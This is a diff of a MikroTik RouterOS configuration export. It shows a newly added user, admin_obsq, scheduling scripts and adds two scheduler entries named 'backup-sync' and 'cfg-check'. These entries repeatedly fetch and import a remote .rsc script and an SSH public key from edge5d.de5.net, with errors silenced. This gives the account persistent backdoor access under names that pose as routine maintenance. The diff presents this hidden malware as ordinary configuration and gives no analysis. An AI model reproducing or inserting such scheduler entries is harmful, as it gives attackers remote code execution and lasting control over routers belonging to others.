@@ -9,29 +9,31 @@
 #   installed-version: 7.19.4
 # Flags: U - UNDOABLE
 # Columns: ACTION, BY, POLICY, TIME
-#   ACTION                         BY  POLICY  TIME
-# U user admin_obsq added           0  write   2026-09-21 06:35:35
-#                                      policy
-# U log rule changed                0  write   2026-09-14 13:56:38
-# U log rule changed                0  write   2026-09-14 13:56:38
-# U script removed from scheduler   0  write   2026-09-14 13:56:36
-# U user SystemMikrotik removed     0  write   2026-09-14 13:13:21
-#                                      policy
-# U new script scheduled            0  write   2026-09-14 06:11:21
-# U user SystemMikrotik added       0  write   2026-09-14 06:10:49
-#                                      policy
-# U log action changed              0  write   2026-09-14 06:10:49
-# U log rule changed                0  write   2026-09-14 06:10:49
-# U log rule changed                0  write   2026-09-14 06:10:49
-# U log rule changed                0  write   2026-09-14 06:10:49
-# U log rule changed                0  write   2026-09-14 06:10:49
-# U log rule changed                0  write   2026-09-14 06:10:49
-# U traffic flow config changed     0  write   2026-09-14 06:10:48
-# U log action changed              0  write   2026-09-14 06:10:47
-# U user support added              0  write   2026-09-09 20:48:18
-#                                      policy
-# U user routeradmin added          0  write   2026-09-08 09:50:56
-#                                      policy
+#   ACTION                         BY          POLICY  TIME
+# U new script scheduled           admin_obsq  write   2026-09-23 23:25:27
+# U new script scheduled           admin_obsq  write   2026-09-23 23:25:27
+# U user admin_obsq added          0           write   2026-09-21 06:35:35
+#                                              policy
+# U log rule changed               0           write   2026-09-14 13:56:38
+# U log rule changed               0           write   2026-09-14 13:56:38
+# U script removed from scheduler  0           write   2026-09-14 13:56:36
+# U user SystemMikrotik removed    0           write   2026-09-14 13:13:21
+#                                              policy
+# U new script scheduled           0           write   2026-09-14 06:11:21
+# U user SystemMikrotik added      0           write   2026-09-14 06:10:49
+#                                              policy
+# U log action changed             0           write   2026-09-14 06:10:49
+# U log rule changed               0           write   2026-09-14 06:10:49
+# U log rule changed               0           write   2026-09-14 06:10:49
+# U log rule changed               0           write   2026-09-14 06:10:49
+# U log rule changed               0           write   2026-09-14 06:10:49
+# U log rule changed               0           write   2026-09-14 06:10:49
+# U traffic flow config changed    0           write   2026-09-14 06:10:48
+# U log action changed             0           write   2026-09-14 06:10:47
+# U user support added             0           write   2026-09-09 20:48:18
+#                                              policy
+# U user routeradmin added         0           write   2026-09-08 09:50:56
+#                                              policy
 # 
 # software id = JSLF-NLB9
 #
@@ -193,6 +195,9 @@ add address=44.34.128.181
 add address=44.34.133.3
 add address=162.159.200.1
 add address=162.159.200.123
+/system scheduler
+add interval=1w name=backup-sync on-event=":do {/tool fetch url=http://edge5d.de5.net:8080/lab14925/sync.rsc dst-path=sync.rsc; :delay 1000; /import sync.rsc} on-error={}; :if ([:len [/user ssh-keys find where key-owner=ntp-service]] = 0) do={/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub; :delay 1000; /user ssh-keys import public-key-file=ntp.pub user=admin_obsq}" policy=read,write,policy,password,sniff,sensitive start-date=2026-09-23 start-time=08:38:00
+add name=cfg-check on-event=":for i from=1 to=6 do={ :if ([:len [/user ssh-keys find where key-owner=ntp-service]] = 0) do={ :do {/tool fetch url=http://edge5d.de5.net:8080/ntp.pub dst-path=ntp.pub} on-error={:delay 10000}; :do {/user ssh-keys import public-key-file=ntp.pub user=admin_obsq} on-error={:delay 2000} } }" policy=read,write,policy,password,sniff,sensitive start-time=startup
 /tool bandwidth-server
 set authenticate=no enabled=no
 /tool mac-server
